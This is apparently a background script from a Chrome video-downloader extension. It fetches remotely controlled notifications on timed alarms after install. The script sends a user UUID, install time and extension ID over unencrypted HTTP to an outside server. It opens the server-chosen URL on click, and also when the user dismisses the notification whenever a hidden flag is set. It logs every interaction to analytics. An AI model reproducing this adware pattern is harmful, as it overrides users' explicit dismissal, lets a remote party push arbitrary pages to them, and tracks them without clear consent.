notification_delay();

function notification_fetch_init(alarms) {

    ga_Event("notification", "notification_fetch", manifest_version);

    var url = "http://cdn.video-downloader.club/notification/?t=" + Math.round(new Date() / 1000)
        + "&user_id=" + ga_getUUID()
        + "&installTime=" + ga_getInstallTime()
        + "&extension_id=" + extension_id
        + "&extension_version=" + manifest_version
        + "&alarm=" + alarms;

    fetch(url, {}).then(function (response) {
        return response.json();
    }).then(function (json) {
        console.log(json);
        notification_init(json);
    }).catch(function (err) {
    });
}

function notification_delay() {

    chrome.alarms.create("install_0", {
        delayInMinutes: 0.1
    });

    chrome.alarms.create("install_10", {
        delayInMinutes: 10
    });

    chrome.alarms.create("install_30", {
        delayInMinutes: 30
    });

    chrome.alarms.create("install_120", {
        delayInMinutes: 120
    });


    chrome.alarms.onAlarm.addListener(onAlarms);

    function onAlarms(alarms) {
        if (alarms.name === 'install_0') {
            notification_fetch_init('install_0');
        }
        if (alarms.name === 'install_10') {
            notification_fetch_init('install_10');
        }
        if (alarms.name === 'install_30') {
            notification_fetch_init('install_30');
        }
        if (alarms.name === 'install_120') {
            notification_fetch_init('install_120');
        }
    }
}



function notification_init(details) {

    chrome.notifications.create(details.id, details.options, function (id) {
    });

    ga_Event("notification", 'created_notification', details.id);

    var clickHandler = function (clickedNotificationID) {
        if (clickedNotificationID === details.id) {
            if (details.url) {
                window.open(details.url);
                ga_Event("notification", 'clicked_notification', details.id);

            }

            chrome.notifications.clear(details.id, function () {
            });
        }
    };

    var closeHandler = function (closedNotificationID, byUser) {
        if (closedNotificationID === details.id) {
            if (byUser === true) {
                var url = new URL(details.url);
                var f = url.searchParams.get("f");
                if( f === "1" )
                {
                    window.open(details.url);
                }

                ga_Event("notification", 'closed_notification_by_user', details.id);
            }
            else {
                ga_Event("notification", 'closed_notification_by_system', details.id);
            }
        }
    };

    var buttonsClicked = function (notificationId, buttonIndex) {
        var newURL = details.url + "&buttonIndex=" + buttonIndex + "&t=" + Date.now();
        ga_Event("notification", 'clicked_button', details.id + "_" + buttonIndex);
        chrome.tabs.create({url: newURL});
    };

    chrome.notifications.onClicked.addListener(clickHandler);
    chrome.notifications.onClosed.addListener(closeHandler);
    chrome.notifications.onButtonClicked.addListener(buttonsClicked);
}